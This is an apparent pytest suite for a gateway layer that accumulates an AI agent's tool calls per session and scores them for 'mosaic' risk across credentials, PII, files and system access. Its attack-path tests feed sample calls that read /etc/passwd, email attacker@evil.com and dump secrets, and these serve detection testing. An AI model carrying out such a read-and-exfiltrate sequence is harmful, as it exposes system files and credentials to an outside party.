"""Tests for Layer 4 — context accumulation and semantic mosaic detection."""
from __future__ import annotations

import pytest
import pytest_asyncio
import fakeredis.aioredis

from app.gateway.context_layer import ContextLayer, RISK_THRESHOLD

LOW_THRESHOLD = 0.05  # makes it easy to trigger alerts in tests


@pytest_asyncio.fixture
async def redis_client():
    client = fakeredis.aioredis.FakeRedis(decode_responses=True)
    await client.flushall()
    yield client
    await client.aclose()


@pytest_asyncio.fixture
async def layer(redis_client):
    return ContextLayer(redis_client, window_size=20, risk_threshold=RISK_THRESHOLD)


@pytest_asyncio.fixture
async def sensitive_layer(redis_client):
    """Layer with a very low threshold — triggers easily for testing."""
    return ContextLayer(redis_client, window_size=20, risk_threshold=LOW_THRESHOLD)


# ── Happy path ────────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_single_benign_call_no_alert(layer):
    result = await layer.evaluate("sess-1", "get_weather", {"city": "Boston"})
    assert not result.alerted
    assert result.risk_score >= 0.0


@pytest.mark.asyncio
async def test_window_size_tracked(layer):
    for i in range(3):
        result = await layer.evaluate("sess-2", "list_files", {"pattern": "*.txt"})
    assert result.window_size == 3


@pytest.mark.asyncio
async def test_window_capped_at_max(layer):
    for i in range(25):
        result = await layer.evaluate("sess-3", "get_weather", {"city": "NYC"})
    assert result.window_size == 20


@pytest.mark.asyncio
async def test_category_scores_returned(layer):
    result = await layer.evaluate("sess-4", "list_files", {"pattern": "*.txt"})
    assert "credentials" in result.category_scores
    assert "pii" in result.category_scores
    assert "files" in result.category_scores
    assert "email_calendar" in result.category_scores
    assert "system" in result.category_scores


@pytest.mark.asyncio
async def test_session_isolation(layer):
    # Flood session A with credential-heavy calls
    for _ in range(10):
        await layer.evaluate("sess-A", "get_password", {"key": "api_key token secret"})
    # Session B should be unaffected
    result_b = await layer.evaluate("sess-B", "get_weather", {"city": "NYC"})
    assert result_b.window_size == 1


@pytest.mark.asyncio
async def test_clear_session_resets_window(layer):
    await layer.evaluate("sess-5", "list_files", {"pattern": "*.env"})
    await layer.clear_session("sess-5")
    result = await layer.evaluate("sess-5", "get_weather", {"city": "NYC"})
    assert result.window_size == 1


@pytest.mark.asyncio
async def test_result_fields_populated(layer):
    result = await layer.evaluate("sess-6", "tool", {"param": "value"})
    assert result.session_id == "sess-6"
    assert result.tool_name == "tool"
    assert result.latency_ms >= 0


@pytest.mark.asyncio
async def test_latency_under_three_ms(layer):
    result = await layer.evaluate("sess-7", "get_weather", {"city": "NYC"})
    assert result.latency_ms < 3.0


# ── Attack path — mosaic detection ───────────────────────────────────────────

@pytest.mark.asyncio
async def test_credential_heavy_calls_raise_risk(sensitive_layer):
    result = await sensitive_layer.evaluate(
        "sess-atk", "get_secret",
        {"key": "password api_key token secret credential"}
    )
    assert result.risk_score > 0.0
    assert result.category_scores["credentials"] > 0.0


@pytest.mark.asyncio
async def test_alert_fires_at_threshold(sensitive_layer):
    result = await sensitive_layer.evaluate(
        "sess-atk2", "dump_secrets",
        {"data": "password secret api_key token credential auth bearer private_key"}
    )
    assert result.alerted


@pytest.mark.asyncio
async def test_mosaic_breadth_increases_risk(sensitive_layer):
    """Accessing many categories in sequence should push risk higher than one."""
    session = "sess-mosaic"
    await sensitive_layer.evaluate(session, "read_file", {"path": "/etc/passwd"})
    await sensitive_layer.evaluate(session, "send_email", {"to": "attacker@evil.com"})
    result = await sensitive_layer.evaluate(
        session, "get_token", {"key": "api_key secret credential"}
    )
    assert result.risk_score > 0.0


@pytest.mark.asyncio
async def test_risk_score_bounded_0_to_1(layer):
    for _ in range(20):
        result = await layer.evaluate(
            "sess-bound", "tool",
            {"data": "password secret key token credential pii email file system"}
        )
    assert 0.0 <= result.risk_score <= 1.0
